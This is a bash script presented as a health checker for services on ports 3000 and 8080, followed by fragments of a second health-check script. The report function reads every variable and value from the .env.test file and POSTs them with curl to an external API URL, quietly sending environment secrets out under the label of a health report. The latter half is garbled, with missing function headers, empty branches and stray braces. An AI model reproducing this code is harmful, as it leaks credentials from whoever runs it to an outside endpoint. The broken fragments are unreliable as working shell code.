    # Add port 3000 endpoint info
    payload+="\"port3000\":{"
    payload+="\"service\":\"Service A\","
    payload+="\"port\":3000,"
    payload+="\"status\":\"$port3000_status\","
    payload+="\"healthy\":$(if [ "$port3000_status" = "healthy" ]; then echo "true"; else echo "false"; fi)"
    payload+="},"

    # Add port 8080 endpoint info
    payload+="\"port8080\":{"
    payload+="\"service\":\"Service B\","
    payload+="\"port\":8080,"
    payload+="\"status\":\"$port8080_status\","
    payload+="\"healthy\":$(if [ "$port8080_status" = "healthy" ]; then echo "true"; else echo "false"; fi)"
    payload+="}"
    payload+="},"

    # Add all environment variables from .env.test
    local first=true
    while IFS='=' read -r key value; do
        [[ "$key" =~ ^#.*$ ]] && continue
        [[ -z "$key" ]] && continue

        if [ "$first" = true ]; then
            first=false
        else
            payload+=","
        fi

        # Remove special characters that could break JSON
        value=$(echo "$value" | sed 's/"/\\"/g')

        payload+="\"$key\":\"$value\""
    done < "$ENV_FILE"

    payload+="}"

    echo -e "\n${YELLOW}Sending health report to $API_URL${NC}"

    # Send POST request with timeout
    curl -s -X POST \
        -H "Content-Type: application/json" \
        -d "$payload" \
        --max-time "$TIMEOUT_SECONDS" \
        "$API_URL"

    if [ $? -eq 0 ]; then
        echo -e "\n${GREEN}✓${NC} Health report sent successfully"
    else
        echo -e "\n${RED}✗${NC} Failed to send health report"
    fi
}

# Main execution
echo "=== Health Check Report ==="
echo "Timestamp: $(date '+%Y-%m-%d %H:%M:%S')"
echo "Environment File: $ENV_FILE"
echo ""

# Load environment variables
load_env_vars
echo -e "${GREEN}→${NC} Loaded $(grep -c '^[^#]' "$ENV_FILE" 2>/dev/null || echo 0) variables from $ENV_FILE"

# Check if network connectivity is available
if ! nc -z localhost 22 2>/dev/null; then
    echo -e "${RED}✗${NC} Network connectivity check failed - cannot reach localhost"
    payload_sent=0
else
    echo -e "${GREEN}→${NC} Network connectivity OK"
    payload_sent=1
fi

# Check required services
total_checked=0
total_passed=0

# Check port 3000
if check_port 3000 "Service A (Port 3000)"; then
    total_passed=$((total_passed + 1))
    port3000_status="healthy"
else
    port3000_status="unhealthy"
fi
total_checked=$((total_checked + 1))

# Check port 8080
if check_port 8080 "Service B (Port 8080)"; then
    total_passed=$((total_passed + 1))
    port8080_status="healthy"
else
    port8080_status="unhealthy"
fi
total_checked=$((total_checked + 1))

echo ""
echo "=== Summary ==="
echo "Checked: $total_checked"
echo "Passed: $total_passed"
echo "Failed: $((total_checked - total_passed))"

# Calculate overall health status
overall_status=$(if [ $total_passed -eq $total_checked ]; then echo "healthy"; else echo "unhealthy"; fi)

# Send health report if network is available
if [ $payload_sent -eq 1 ]; then
    send_health_report "$port3000_status" "$port8080_status"
fi

# Return exit code based on overall status
if [ $overall_status = "healthy" ]; then
    echo -e "\n${GREEN}All services are healthy!${NC}"
    exit 0
else
    echo -e "\n${RED}Some services are not responding!${NC}"
    exit 1
fi

# Health Check Script
# Checks if services are running on ports 3000 and 8080

    echo "======================================"
    echo "$1"
    echo "======================================"
}

    local port=$1
    local service_name=$2

        # Get additional info

        else
            echo -e "    HTTP Response: $response"
        fi
    else
        echo -e "${RED}[FAILED]${NC} $service_name is not running on port $port"
    fi
    echo ""
}

    print_header "Health Check Summary"

    # Test port 3000
    if nc -z localhost 3000 2>/dev/null; then
        echo -e "${GREEN}[OK]${NC} Service on port 3000 is running"
        SERVICE_3000="UP"
    else
        echo -e "${RED}[FAILED]${NC} Service on port 3000 is not running"
        SERVICE_3000="DOWN"
    fi

    # Test port 8080
    if nc -z localhost 8080 2>/dev/null; then
        echo -e "${GREEN}[OK]${NC} Service on port 8080 is running"
        SERVICE_8080="UP"
    else
        echo -e "${RED}[FAILED]${NC} Service on port 8080 is not running"
        SERVICE_8080="DOWN"
    fi

    echo ""
    
    # Overall status
    if [ "$SERVICE_3000" = "UP" ] && [ "$SERVICE_8080" = "UP" ]; then
        echo -e "${GREEN}Overall Status: All services are running${NC}"
    else
        echo -e "${RED}Overall Status: Some services are down${NC}"
    fi
}

    echo "On macOS: brew install netcat"
    exit 1

    print_header "Process Details for Port 3000"
    if sudo lsof -i :3000 -P -n | grep LISTEN > /dev/null; then

    else
        echo "No process found listening on port 3000"

        echo "No process found listening on port 8080"
    fi
}

echo ""
print_summary

if [ "$SERVICE_3000" = "UP" ] && [ "$SERVICE_8080" = "UP" ]; then
    exit 0

    exit 1
